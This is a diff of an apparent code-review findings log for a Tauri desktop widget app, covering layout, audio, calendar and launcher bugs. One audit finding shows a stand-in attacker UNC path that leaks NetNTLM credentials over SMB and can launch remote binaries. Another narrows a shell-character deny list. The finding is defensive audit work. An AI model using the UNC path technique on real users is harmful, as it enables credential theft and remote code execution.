-- **Why**: The backend already implements and registers a dedicated custom URI protocol `vvidget://album-art?t=<track_id>` in `protocol.rs` and `lib.rs`, but `read_session_data` bypasses it in favor of generating base64 data URLs inside the polling loop.
-- **Fix**:
-```diff
---- a/src-tauri/src/media/gsmtc.rs
-+++ b/src-tauri/src/media/gsmtc.rs
-@@ -180,8 +180,6 @@ mod win {
-         let mut album_art_url = None;
--        if let Some(art) = get_cached_album_art(&track_id) {
--            use base64::{engine::general_purpose::STANDARD, Engine as _};
--            let b64 = STANDARD.encode(&art.bytes);
--            album_art_url = Some(format!("data:{};base64,{}", art.mime_type, b64));
-+        if get_cached_album_art(&track_id).is_some() {
-+            album_art_url = Some(format!("vvidget://album-art?t={}", track_id));
-         } else if let Ok(thumb_ref) = media_props.Thumbnail() {
-@@ -199,6 +197,5 @@ mod win {
-                                             .unwrap_or_else(|_| "image/jpeg".to_string());
--                                        use base64::{engine::general_purpose::STANDARD, Engine as _};
--                                        let b64 = STANDARD.encode(&bytes);
--                                        album_art_url = Some(format!("data:{};base64,{}", mime_type, b64));
-+                                        album_art_url = Some(format!("vvidget://album-art?t={}", track_id));
-                                         set_cached_album_art(&track_id, bytes, mime_type);
-```
-
-### [MAJOR] [FIXED] M3-06 GSMTC background monitor repeatedly requests new SessionManager COM instances instead of subscribing to events
-- **Status**: FIXED
-- **Where**: `src-tauri/src/media/gsmtc.rs:30-35,247`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: robustness [lens: F1b]
-- **Scenario**: Throughout application execution, the `media-monitor` background thread repeatedly executes `GlobalSystemMediaTransportControlsSessionManager::RequestAsync()?.get()` every 500ms (7,200 times per hour), creating continuous COM activation requests and query overhead on the Windows media control subsystem while idle.
-- **Why**: WinRT GSMTC exposes event notifications (`CurrentSessionChanged`, `SessionsChanged`, `PlaybackInfoChanged`, `MediaPropertiesChanged`), but the codebase relies entirely on continuous polling and instantiates a new `GlobalSystemMediaTransportControlsSessionManager` on every poll.
-- **Fix**:
-```diff
---- a/src-tauri/src/media/gsmtc.rs
-+++ b/src-tauri/src/media/gsmtc.rs
-@@ -30,6 +30,12 @@ mod win {
-+    use std::sync::OnceLock;
-+    static SESSION_MGR: OnceLock<GlobalSystemMediaTransportControlsSessionManager> = OnceLock::new();
-+
-     fn get_session_manager() -> Result<GlobalSystemMediaTransportControlsSessionManager, String> {
-+        if let Some(mgr) = SESSION_MGR.get() {
-+            return Ok(mgr.clone());
+@@ -110,2 +110,3 @@ mod windows_impl {
+     const S_OK: HRESULT = HRESULT(0);
++    const E_POINTER: HRESULT = HRESULT(-2147467261);
+     const E_NOINTERFACE: HRESULT = HRESULT(-2147467262);
+@@ -210,2 +211,5 @@ mod windows_impl {
+     ) -> HRESULT {
++        if result.is_null() {
++            return E_POINTER;
 +        }
-         GlobalSystemMediaTransportControlsSessionManager::RequestAsync()
-             .map_err(|e| format!("Failed to request GSMTC session manager: {}", e))?
-             .get()
-+            .map(|mgr| { let _ = SESSION_MGR.set(mgr.clone()); mgr })
-             .map_err(|e| format!("Failed to await GSMTC session manager: {}", e))
-     }
+         let obj = &*(this as *mut CustomIterator);
+@@ -354,2 +358,5 @@ mod windows_impl {
+     ) -> HRESULT {
++        if result.is_null() {
++            return E_POINTER;
++        }
+         let obj = &*(this as *mut CustomIterable);
 ```
 
-### [MAJOR] [FIXED] M3-07 `launch_app_or_uri` spawns processes with null `lpDirectory`, causing relative file access crashes
+### [CRITICAL] [FIXED] X-fluent-ux-security-01 Unrestricted UNC Network Path and SMB Credential Leak in `validate_launch_target`
 - **Status**: FIXED
-- **Where**: `src-tauri/src/launcher/mod.rs:518-526`
-- **Source**: `r-review` (2026-10-26)
+- **Where**: `src-tauri/src/launcher/mod.rs:455-467`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
 - **Confidence**: HIGH
-- **Category**: bug [lens: F1b]
-- **Scenario**: A user launches an application or game (e.g. `C:\Games\Doom\doom.exe` or a portable app) from the launcher widget. `ShellExecuteW` is called with `lpDirectory` set to `PCWSTR::null()`. The new process inherits vvidget's working directory (`C:\Program Files\vvidget`). When the launched executable tries to read relative configuration files, game assets, or dependency DLLs in its own folder, it fails and crashes immediately on launch.
-- **Why**: `ShellExecuteW` defaults to the caller process's current directory when `lpDirectory` is null. For executable targets, `lpDirectory` must explicitly specify the target file's parent folder.
+- **Category**: security
+- **Scenario**: An attacker or untrusted payload triggers `add_custom_launcher_item` or `launch_app_or_uri(r"\\attacker-server\share\game.exe")`.
+- **Why**: `validate_launch_target` verifies non-URI paths using `Path::new(trimmed).is_absolute()`, but does not reject UNC path prefixes (`\\` or `//`). In Rust on Windows, UNC paths have `Prefix::UNC` and are treated as absolute. When `validate_launch_target` proceeds to `path.exists()`, Windows immediately initiates an outbound SMB connection on TCP port 445, leaking the user's NetNTLM credentials to an external host. If the remote share hosts an executable, `ShellExecuteW` subsequently launches arbitrary remote binaries.
 - **Fix**:
 ```diff
 --- a/src-tauri/src/launcher/mod.rs
 +++ b/src-tauri/src/launcher/mod.rs
-@@ -512,4 +512,12 @@ pub async fn launch_app_or_uri(target: String) -> Result<(), String> {
-         let wide_target: Vec<u16> = std::ffi::OsStr::new(&target)
-             .encode_wide()
-             .chain(std::iter::once(0))
-             .collect();
-+        let parent_dir = std::path::Path::new(&target).parent().map(|p| {
-+            std::ffi::OsStr::new(p).encode_wide().chain(std::iter::once(0)).collect::<Vec<u16>>()
-+        });
-+        let wide_dir_ptr = match &parent_dir {
-+            Some(d) => windows::core::PCWSTR(d.as_ptr()),
-+            None => windows::core::PCWSTR::null(),
-+        };
- 
-         unsafe {
-             let res = ShellExecuteW(
-@@ -522,3 +530,3 @@ pub async fn launch_app_or_uri(target: String) -> Result<(), String> {
-                 windows::core::PCWSTR(wide_target.as_ptr()),
-                 windows::core::PCWSTR::null(),
--                windows::core::PCWSTR::null(),
-+                wide_dir_ptr,
-                 windows::Win32::UI::WindowsAndMessaging::SW_SHOWNORMAL,
-```
-
-### [MAJOR] [FIXED] M3-08 `validate_launch_target` falsely blocks valid Windows paths containing `'&'` or `'\''`
-- **Status**: FIXED
-- **Where**: `src-tauri/src/launcher/mod.rs:444-453`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug [lens: F1b]
-- **Scenario**: A user attempts to add or launch an installed game located in paths like `D:\Games\Command & Conquer\game.exe`, `C:\Program Files\Rockstar Games & Media\app.exe`, or under a Windows user directory with an apostrophe (e.g. `C:\Users\O'Connor\AppData\...`). `validate_launch_target` rejects the target with `"Launch target contains forbidden shell character: '&'"`, preventing users from launching valid games and applications.
-- **Why**: The validation logic treats `'&'` and `'\''` as command injection risks. However, `ShellExecuteW` does not execute commands through a shell interpreter, and `validate_launch_target` already verifies that the path is an absolute, existing `.exe`, `.lnk`, or `.url` file on the filesystem.
-- **Fix**:
-```diff
---- a/src-tauri/src/launcher/mod.rs
-+++ b/src-tauri/src/launcher/mod.rs
-@@ -443,6 +443,6 @@ pub fn validate_launch_target(target: &str) -> Result<(), String> {
-     // Disallow shell operators and chaining characters in paths
--    let dangerous_path_chars = ['&', '|', ';', '>', '<', '"', '\'', '`', '$', '%'];
-+    let dangerous_path_chars = ['|', ';', '>', '<', '"', '`'];
-     for dc in dangerous_path_chars {
-         if trimmed.contains(dc) {
-             return Err(format!(
-```
-
-### [MAJOR] [FIXED] M4-02 `Math.ceil` in `gridCollision.ts` generates off-grid candidate coordinates clamped outside desktop grid
-- **Status**: FIXED
-- **Where**: `src/utils/gridCollision.ts:63-78`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: When work area height or width does not evenly divide by grid step (e.g. 1032px work area height with taskbar, 240px widget height, `maxY = 792`, `gridY = 120`), dragging to bottom causes `candY = 792`.
-- **Why**: `maxRow` and `maxCol` are computed using `Math.ceil(maxY / gridY)` (e.g., `Math.ceil(792 / 120) = 7`). In the candidate search loop, `Math.min(maxY, r * gridY)` produces `Math.min(792, 840) = 792`, which is not an integer multiple of `gridY` (792 / 120 = 6.6). The widget snaps to an off-grid position, breaking icon-grid desktop alignment.
-- **Fix**:
-```diff
---- a/src/utils/gridCollision.ts
-+++ b/src/utils/gridCollision.ts
-@@ -48,4 +48,4 @@ export function findNearestNonOverlappingSlot(
-   const candidate = {
--    x: Math.max(minX, Math.min(maxX, baseSnappedX)),
--    y: Math.max(minY, Math.min(maxY, baseSnappedY)),
-+    x: Math.max(minX, Math.min(Math.floor(maxX / gridX) * gridX, baseSnappedX)),
-+    y: Math.max(minY, Math.min(Math.floor(maxY / gridY) * gridY, baseSnappedY)),
-     width,
-     height,
-   };
-@@ -62,4 +62,4 @@ export function findNearestNonOverlappingSlot(
-   const minCol = Math.floor(minX / gridX);
--  const maxCol = Math.ceil(maxX / gridX);
-+  const maxCol = Math.floor(maxX / gridX);
-   const minRow = Math.floor(minY / gridY);
--  const maxRow = Math.ceil(maxY / gridY);
-+  const maxRow = Math.floor(maxY / gridY);
-```
-
-### [MAJOR] [FIXED] M4-03 Invisible `HeaderBar` lacks `pointer-events-none` when `opacity-0` and occludes top of widget content
-- **Status**: FIXED
-- **Where**: `src/components/layout/HeaderBar.tsx:66-70`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: In independent window mode, user hovers over and attempts to click top controls/buttons inside a widget (e.g. Spotify widget or Resource widget).
-- **Why**: `HeaderBar` is rendered as an absolute overlay (`absolute top-0 left-0 right-0 z-20`) with `opacity-0 group-hover:opacity-100`. Because `pointer-events-none` is omitted when not hovered, the invisible header intercepts pointer clicks in the top 36px of the card. Furthermore, the widget content container lacks top padding to accommodate the header when hovered, causing the header to overlay and block underlying interactive elements.
-- **Fix**:
-```diff
---- a/src/components/layout/HeaderBar.tsx
-+++ b/src/components/layout/HeaderBar.tsx
-@@ -67,3 +67,3 @@ export const HeaderBar: FC<HeaderBarProps> = ({
-           "absolute top-0 left-0 right-0 z-20 backdrop-blur-md bg-[var(--fluent-acrylic-bg)]/80 rounded-t-2xl",
--          "opacity-0 group-hover:opacity-100 group-focus-within:opacity-100 transition-opacity duration-150",
-+          "opacity-0 pointer-events-none group-hover:opacity-100 group-hover:pointer-events-auto group-focus-within:opacity-100 group-focus-within:pointer-events-auto transition-opacity duration-150",
-           isGridDragging && "opacity-100"
-```
-
-### [MAJOR] [FIXED] M4-04 Conditional DOM unmounting of children in `DockItem` destroys widget state and causes abrupt layout shift
-- **Status**: FIXED
-- **Where**: `src/components/docking/DockItem.tsx:98-105`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: robustness
-- **Scenario**: User collapses a widget item in the Dock (e.g. active Speedtest or Spotify player), then expands it later.
-- **Why**: `DockItem` completely unmounts `{children}` via `!isCollapsed && (...)`. Unmounting destroys active React state, cancels running background timers/network streams, and resets widget state from scratch on expansion. Furthermore, removing the element from the DOM makes the declared `transition-all duration-200` ineffective, producing an instantaneous layout snap.
-- **Fix**:
-```diff
---- a/src/components/docking/DockItem.tsx
-+++ b/src/components/docking/DockItem.tsx
-@@ -98,8 +98,8 @@ export const DockItem: FC<DockItemProps> = ({
--      {!isCollapsed && (
--        <div
--          className="p-2.5 transition-all duration-200"
--          data-testid={`dock-item-content-${id}`}
--        >
--          {children}
--        </div>
--      )}
-+      <div
-+        className={cn(
-+          "p-2.5 transition-all duration-200 overflow-hidden",
-+          isCollapsed && "hidden"
-+        )}
-+        data-testid={`dock-item-content-${id}`}
-+      >
-+        {children}
-+      </div>
-```
-
-### [MAJOR] [FIXED] M4-05 Tooltips clipped by parent `Card` `overflow-hidden` when positioned at `top` or right boundaries
-- **Status**: FIXED
-- **Where**: `src/components/docking/DockItem.tsx:37, 64-80` & `src/components/ui/Tooltip.tsx:51-55`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: User hovers over "Hide from Dock" or collapse chevron in `DockItem`.
-- **Why**: `DockItem` wraps its content in `<Card ... className="... overflow-hidden ...">`. `DockItem` assigns `position="top"` to tooltips at the very top edge of the card, placing the tooltip at `bottom-full` (outside the top boundary). The parent's `overflow-hidden` completely clips the tooltip flyout, rendering it invisible.
-- **Fix**:
-```diff
---- a/src/components/docking/DockItem.tsx
-+++ b/src/components/docking/DockItem.tsx
-@@ -64,3 +64,3 @@ export const DockItem: FC<DockItemProps> = ({
-           {onHide && (
--            <Tooltip content="Hide from Dock" position="top" delay={300}>
-+            <Tooltip content="Hide from Dock" position="bottom" delay={300}>
-               <button
-@@ -77,3 +77,3 @@ export const DockItem: FC<DockItemProps> = ({
-           <Tooltip
-             content={isCollapsed ? "Expand widget" : "Collapse widget"}
--            position="top"
-+            position="bottom"
-             delay={300}
-```
-
-### [MAJOR] [FIXED] M4-06 Undefined CSS token `--fluent-card-subtle` breaks active grid drag visual feedback
-- **Status**: FIXED
-- **Where**: `src/styles/fluent.css:3-33` & `src/components/layout/HeaderBar.tsx:58`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: User drags an independent widget window. `HeaderBar` sets `bg-[var(--fluent-card-subtle)]`.
-- **Why**: `HeaderBar.tsx` references `bg-[var(--fluent-card-subtle)]` for the dragging state, but `--fluent-card-subtle` is never defined in `fluent.css` (neither in `:root` nor in `.theme-light`). The CSS variable evaluates to empty, rendering the drag header background transparent instead of shaded.
-- **Fix**:
-```diff
---- a/src/styles/fluent.css
-+++ b/src/styles/fluent.css
-@@ -10,2 +10,3 @@
-   --fluent-card-active: rgba(255, 255, 255, 0.06);
-+  --fluent-card-subtle: rgba(255, 255, 255, 0.02);
-   --fluent-stroke: rgba(255, 255, 255, 0.08);
-@@ -39,2 +40,3 @@
-   --fluent-card-active: rgba(255, 255, 255, 0.8);
-+  --fluent-card-subtle: rgba(255, 255, 255, 0.5);
-   --fluent-stroke: rgba(0, 0, 0, 0.08);
-```
-
-### [MAJOR] [FIXED] M5-01 BatterySparkline flexbox centering and missing min-h-0 causes SVG vertical collapse and clipping
-- **Status**: FIXED
-- **Where**: `src/widgets/battery/BatterySparkline.tsx:68-78`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: Laptop battery status contains 4 capacity samples (e.g., `[82, 82, 82, 82]`). The header displays "Kapazitätsverlauf 4 Messpunkte", but the sparkline graph area below it is completely blank.
-- **Why**: The outer wrapper `<div className="w-full overflow-hidden flex flex-col justify-center" style={{ height: `${height}px` }}>` wraps an `<svg viewBox="0 0 100 100" className="w-full h-full overflow-visible">`. In CSS Flexbox, SVG elements default to `min-height: auto`, which resolves to their 1:1 intrinsic aspect-ratio height (~280-320px based on widget width). `justify-center` vertically centers this 280px tall element inside the 32px box, translating the SVG top to approximately -124px. Because high battery charge levels (75-100%) render near the top of the viewBox (y = 8..25), the path is placed at screen position ~-100px and completely clipped away by `overflow-hidden`. Additionally, `preserveAspectRatio="none"` non-uniformly distorts the marker circle into a flattened ellipse and clips its right half at x=100.
-- **Fix**:
-```diff
---- a/src/widgets/battery/BatterySparkline.tsx
-+++ b/src/widgets/battery/BatterySparkline.tsx
-@@ -65,13 +65,13 @@ export const BatterySparkline: FC<BatterySparklineProps> = ({
-   const lastPoint = coords[coords.length - 1];
- 
-   return (
-     <div
--      className={cn("w-full overflow-hidden flex flex-col justify-center", className)}
-+      className={cn("w-full overflow-hidden relative block", className)}
-       style={{ height: `${height}px` }}
-       role="img"
-       aria-label="Akkukapazitätsverlauf Sparkline"
-       data-testid="battery-sparkline"
-     >
-       <svg
-         viewBox="0 0 100 100"
-         preserveAspectRatio="none"
--        className="w-full h-full overflow-visible"
-+        className="w-full h-full block"
-       >
-```
-
----
-
-### [MAJOR] [FIXED] M5-02 Erroneous "Systemlaufwerk" header and MetricBar duplicate label for secondary disk drives
-- **Status**: FIXED
-- **Where**: `src/widgets/resources/ResourceWidget.tsx:160-163, 191`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: System has drive C: and secondary data drive D:. On C:, the card displays "Systemlaufwerk (C:)" in the header and immediately repeats "Systemlaufwerk" inside the MetricBar 5px below. When clicking "D:", the header displays "Systemlaufwerk (D:)" (calling a secondary volume "Systemlaufwerk"), and the MetricBar sub-label also displays "Systemlaufwerk".
-- **Why**: The section header unconditionally hardcodes `"Systemlaufwerk ("` instead of checking if `activeDiskIndex === systemDiskIndex`. In the MetricBar, `label` falls back to `"Systemlaufwerk"` instead of displaying the volume label or "Laufwerk".
-- **Fix**:
-```diff
---- a/src/widgets/resources/ResourceWidget.tsx
-+++ b/src/widgets/resources/ResourceWidget.tsx
-@@ -158,8 +158,10 @@ export const ResourceWidget: FC<ResourceWidgetProps> = ({
-               <div className="flex items-center justify-between mb-1">
-                 <div className="flex items-center gap-1.5 text-xs font-medium">
-                   <HardDrive className="w-3.5 h-3.5 text-emerald-400" />
-                   <span>
--                    Systemlaufwerk ({activeDisk.mount_point.replace(/\\$/, "")})
-+                    {activeDiskIndex === systemDiskIndex ? "Systemlaufwerk" : "Laufwerk"} (
-+                    {activeDisk.mount_point.replace(/\\$/, "")})
-                   </span>
-                 </div>
- 
-                 {/* Windows 11 Segmented Control rounded-[5px] */}
-@@ -188,7 +190,11 @@ export const ResourceWidget: FC<ResourceWidgetProps> = ({
-               </div>
- 
-               <MetricBar
--                label={activeDisk.name !== activeDisk.mount_point && activeDisk.name ? activeDisk.name : "Systemlaufwerk"}
-+                label={
-+                  activeDisk.name && activeDisk.name !== activeDisk.mount_point
-+                    ? activeDisk.name
-+                    : `Belegt (${activeDisk.mount_point.slice(0, 2)})`
-+                }
-                 valueDisplay={`${diskUsedGb} / ${diskTotalGb}`}
-                 percent={diskPercent}
-                 variant={diskVariant}
-```
-
----
-
-### [MAJOR] [FIXED] M5-03 Bluetooth device list overflow, name compression by hidden toggle, and bottom button clipping
-- **Status**: FIXED
-- **Where**: `src/widgets/bluetooth/BluetoothWidget.tsx:203, 278-316, 324-334`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: When two or more devices are paired, the device list overflows the 240px card height. The "Trennen"/"Verbinden" button has `opacity-0` but occupies ~65px in the layout flow permanently, crushing device names down to ~100px. At 125% Windows DPI scaling, the 40-character button text "Windows Bluetooth-Einstellungen öffnen" wraps into two lines, pushing the button outside the card boundaries where its bottom corners are clipped off.
-- **Why**: Hidden hover controls reserve physical flex space in the item row instead of acting as an overlay or appearing on touch/focus. The bottom button text is overly verbose and overflows the available width in small containers.
-- **Fix**:
-```diff
---- a/src/widgets/bluetooth/BluetoothWidget.tsx
-+++ b/src/widgets/bluetooth/BluetoothWidget.tsx
-@@ -280,7 +280,7 @@ export const BluetoothWidget: FC<BluetoothWidgetProps> = ({
-                   {device.battery_level != null && (
-                     <div
-                       data-testid={`device-battery-${device.id}`}
--                      className="flex items-center gap-1 text-[11px] font-medium text-[var(--fluent-text-secondary)] px-1.5 py-0.5 rounded bg-[var(--fluent-subtle-bg)] border border-[var(--fluent-stroke)] flex-shrink-0 group-hover:opacity-40 transition-opacity"
-+                      className="flex items-center gap-1 text-[11px] font-medium text-[var(--fluent-text-secondary)] px-1.5 py-0.5 rounded bg-[var(--fluent-subtle-bg)] border border-[var(--fluent-stroke)] flex-shrink-0 group-hover:hidden"
-                     >
-                       <Battery className="w-3.5 h-3.5 text-emerald-400" />
-                       <span>{device.battery_level}%</span>
-@@ -301,7 +301,7 @@ export const BluetoothWidget: FC<BluetoothWidgetProps> = ({
-                       device.connected
-                         ? "bg-red-500/10 text-red-400 border-red-500/20 hover:bg-red-500/20 hover:border-red-500/40"
-                         : "bg-[var(--fluent-accent-subtle)] text-[var(--fluent-accent)] border-[var(--fluent-accent)]/30 hover:bg-[var(--fluent-accent)]/20 hover:border-[var(--fluent-accent)]",
--                      "opacity-0 group-hover:opacity-100 focus:opacity-100",
-+                      "hidden group-hover:flex focus:flex",
-                       isToggling && "opacity-60 pointer-events-none"
-                     )}
-                   >
-@@ -329,7 +329,7 @@ export const BluetoothWidget: FC<BluetoothWidgetProps> = ({
-           className="w-full py-1.5 px-3 rounded-lg bg-[var(--fluent-card-bg)] hover:bg-[var(--fluent-card-hover)] active:bg-[var(--fluent-card-active)] border border-[var(--fluent-stroke)] text-xs font-medium text-[var(--fluent-text-primary)] flex items-center justify-center gap-1.5 transition-colors focus:outline-none focus:ring-1 focus:ring-[var(--fluent-accent)] flex-shrink-0 cursor-pointer"
-         >
-           <ExternalLink className="w-3.5 h-3.5 text-blue-400" />
--          <span>Windows Bluetooth-Einstellungen öffnen</span>
-+          <span className="truncate">Bluetooth-Einstellungen</span>
-         </button>
-       </div>
-```
-
----
-
-### [MAJOR] [FIXED] M5-04 Custom quick actions missing from customization list, preventing deletion or reordering
-- **Status**: FIXED
-- **Where**: `src/widgets/quick-settings/QuickSettingsWidget.tsx:424-473`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: User adds a custom URL or executable via the "Eigener Pfad / URL" field. The action tile appears on the widget dashboard. When opening the customization menu to delete or reorder it, only `PREDEFINED_ACTIONS` are displayed; custom actions are absent and cannot be unpinned or removed.
-- **Why**: The customization dialog exclusively maps over `PREDEFINED_ACTIONS`. Custom action IDs starting with `custom:` are never rendered in the list, making it impossible to uncheck or delete them from the UI.
-- **Fix**:
-```diff
---- a/src/widgets/quick-settings/QuickSettingsWidget.tsx
-+++ b/src/widgets/quick-settings/QuickSettingsWidget.tsx
-@@ -423,7 +423,7 @@ export const QuickSettingsWidget: FC<QuickSettingsWidgetProps> = ({
-           {/* List of predefined actions with toggle and reordering */}
-           <div className="flex flex-col gap-1">
--            {PREDEFINED_ACTIONS.map((action) => {
-+            {Array.from(new Set([...PREDEFINED_ACTIONS.map((a) => a.id), ...pinnedActionIds])).map((actionId) => {
-+              const action = resolveActionDef(actionId);
-               const isPinned = pinnedActionIds.includes(action.id);
-               const pinnedIndex = pinnedActionIds.indexOf(action.id);
-               const ActionIcon = action.icon;
-```
-
----
-
-### [MAJOR] [FIXED] M5-05 `setVolume` updates UI mute state without unmuting native Windows audio endpoint
-- **Status**: FIXED
-- **Where**: `src/hooks/useMasterVolume.ts:75-91`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: contract
-- **Scenario**: System volume is muted in Windows. In the media widget, user drags the volume slider up from 0 to 45%. The UI shows the unmuted speaker icon, but no sound plays because the Windows Core Audio endpoint remains muted.
-- **Why**: `setVolume` updates React state `setIsMutedState(false)` when `clamped > 0`, but only calls `set_master_volume` over IPC. In Windows WASAPI, `SetMasterVolumeLevelScalar` does not clear the mute flag on `IAudioEndpointVolume`.
-- **Fix**:
-```diff
---- a/src/hooks/useMasterVolume.ts
-+++ b/src/hooks/useMasterVolume.ts
-@@ -82,6 +82,7 @@ export function useMasterVolume(initialVolume = 0.5, initialMuted = false): UseM
-     if (!isTauri()) return;
- 
-     try {
-+      if (isMuted && clamped > 0) {
-+        await safeInvoke("toggle_master_mute");
-+      }
-       await safeInvoke("set_master_volume", { level: clamped });
-     } catch (err) {
-```
-
----
-
-### [MAJOR] [FIXED] M6-02 Upload metric subtitle "Speed test payload" truncated to "Speed test paylo..."
-- **Status**: FIXED
-- **Where**: `src/widgets/speedtest/SpeedtestWidget.tsx:255`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: When viewing the Speedtest widget, the third sub-card (Upload metric) permanently displays "Speed test paylo..." with an ellipsis on screen.
-- **Why**: In `SpeedtestWidget.tsx`, the 3-column sub-card grid allocates only ~92px of horizontal content width per card. The unlocalized English string `"Speed test payload"` (18 characters) exceeds this boundary and is aggressively clipped by the `truncate` CSS utility class.
-- **Fix**:
-```diff
---- a/src/widgets/speedtest/SpeedtestWidget.tsx
-+++ b/src/widgets/speedtest/SpeedtestWidget.tsx
-@@ -252,5 +252,5 @@ export const SpeedtestWidget: FC<SpeedtestWidgetProps> = ({
-               : "--"}{" "}
-             <span className="text-[9px] font-normal text-[var(--fluent-text-secondary)]">Mbps</span>
-           </div>
--          <div className="text-[9px] text-[var(--fluent-text-tertiary)] truncate">Speed test payload</div>
-+          <div className="text-[9px] text-[var(--fluent-text-tertiary)] truncate">Cloudflare Payload</div>
-         </div>
-```
-
-### [MAJOR] [FIXED] M6-03 Direct DOM mutation in launcher `img.onError` hides both icon and fallback initials upon re-render
-- **Status**: FIXED
-- **Where**: `src/widgets/launcher/GameLauncherWidget.tsx:265-272`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: When a launcher item has an invalid or slow `icon_url`, `onError` imperatively removes `"hidden"` from the fallback initials `div` and hides the `<img>`. As soon as any React state update re-renders the component (e.g. typing in the search box, filtering by category, or launching an item), React's reconciliation re-evaluates `item.icon_url && "hidden"` and restores the `"hidden"` class on the initials `div`, while the `<img>` remains at `display: none`. This results in both the image and the fallback initials disappearing entirely, leaving an empty hole.
-- **Why**: The fallback mechanism mutates the DOM directly (`style.display = "none"` and `classList.remove("hidden")`) rather than managing image error state through React component state.
-- **Fix**:
-```diff
---- a/src/widgets/launcher/GameLauncherWidget.tsx
-+++ b/src/widgets/launcher/GameLauncherWidget.tsx
-@@ -260,14 +260,8 @@ export const GameLauncherWidget: FC<GameLauncherWidgetProps> = ({
-                   {item.icon_url ? (
-                     <img
-                       src={item.icon_url}
-                       alt={item.name}
-                       className="w-8 h-8 rounded-md object-cover shadow-sm shrink-0 transition-transform group-hover:scale-105 border border-[var(--fluent-stroke-subtle)]"
--                      onError={(e) => {
--                        // Fallback gracefully to initials if image fails to load
--                        (e.currentTarget as HTMLElement).style.display = "none";
--                        const fallback = e.currentTarget.nextElementSibling;
--                        if (fallback) (fallback as HTMLElement).classList.remove("hidden");
--                      }}
-+                      onError={(e) => { (e.currentTarget as HTMLElement).classList.add("hidden"); }}
-                     />
-                   ) : null}
-```
-
-### [MAJOR] [FIXED] M6-04 Add custom game modal escapes card bounds due to missing `relative` on Card
-- **Status**: FIXED
-- **Where**: `src/widgets/launcher/GameLauncherWidget.tsx:146-153, 343-350`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: Clicking "+ Hinzufügen" in `GameLauncherWidget` opens the modal dialog. Because `Card` does not declare `relative` positioning and `GameLauncherWidget` does not include `relative` in its root classes, the modal's `absolute inset-0` coordinates resolve against whatever ancestor container has relative positioning (e.g., the whole window or docking canvas), stretching the modal backdrop and dialog far outside the launcher widget card.
-- **Why**: `Card.tsx` does not include `relative` in its default class list, and `GameLauncherWidget.tsx` omits `relative` while placing an `absolute inset-0` modal overlay inside it.
-- **Fix**:
-```diff
---- a/src/widgets/launcher/GameLauncherWidget.tsx
-+++ b/src/widgets/launcher/GameLauncherWidget.tsx
-@@ -147,5 +147,5 @@ export const GameLauncherWidget: FC<GameLauncherWidgetProps> = ({
-     <Card
-       variant="acrylic"
-       className={cn(
--        "w-full h-full p-3.5 flex flex-col gap-3 text-[var(--fluent-text-primary)] select-none overflow-hidden",
-+        "relative w-full h-full p-3.5 flex flex-col gap-3 text-[var(--fluent-text-primary)] select-none overflow-hidden",
-         className
-```
-
-### [MAJOR] [FIXED] M6-05 Stale key retention in `useCalendar` preserves deleted calendar dates across updates
-- **Status**: FIXED
-- **Where**: `src/hooks/useCalendar.ts:70-74`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: When all notes for a given calendar date are deleted, the backend removes that date key from `config.calendar_events`. When the updated configuration is received, `useCalendar` executes `setEvents((prev) => ({ ...prev, ...config.calendar_events }))`. Due to the object spread merge, the deleted date key in `prev` is preserved indefinitely in state, causing phantom note indicators (`note-dot`) to remain displayed on the monthly grid.
-- **Why**: `useCalendar.ts` uses shallow object spread merge `{ ...prev, ...config.calendar_events }`, which retains keys that were deleted from the source configuration.
-- **Fix**:
-```diff
---- a/src/hooks/useCalendar.ts
-+++ b/src/hooks/useCalendar.ts
-@@ -69,6 +69,3 @@
-     if (!options?.initialEvents && config.calendar_events) {
--      setEvents((prev) => ({
--        ...prev,
--        ...config.calendar_events,
--      }));
-+      setEvents(config.calendar_events);
+@@ -441,6 +441,12 @@ pub fn validate_launch_target(target: &str) -> Result<(), String> {
+         return Ok(());
      }
-```
-
-### [MAJOR] [FIXED] M6-06 Alarm tab in `ClockWidget` never triggers automatically when current time reaches alarm time
-- **Status**: FIXED
-- **Where**: `src/widgets/clock/ClockWidget.tsx:204-213, 811-828`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: User sets an alarm for "07:00" and enables it (`isAlarmEnabled: true`). When the system clock strikes 07:00, no alarm sounds, no visual alert triggers, and `alarmTriggered` remains false. The only way the alarm state ever flips to true is if the user manually clicks "Alarm-Test simulieren".
-- **Why**: `ClockWidget.tsx` stores `alarmTime` and `isAlarmEnabled`, but contains zero timer or tick effect comparing `currentTime` to `alarmTime`.
-- **Fix**:
-```diff
---- a/src/widgets/clock/ClockWidget.tsx
-+++ b/src/widgets/clock/ClockWidget.tsx
-@@ -212,2 +212,12 @@ export const ClockWidget: FC<ClockWidgetProps> = ({
-     if (alarmTriggered) setAlarmTriggered(false);
-   };
-+
-+  useEffect(() => {
-+    if (!isAlarmEnabled || alarmTriggered) return;
-+    const nowStr = `${digitalTime.hours}:${digitalTime.minutes}`;
-+    if (nowStr === alarmTime && parseInt(digitalTime.seconds, 10) === 0) {
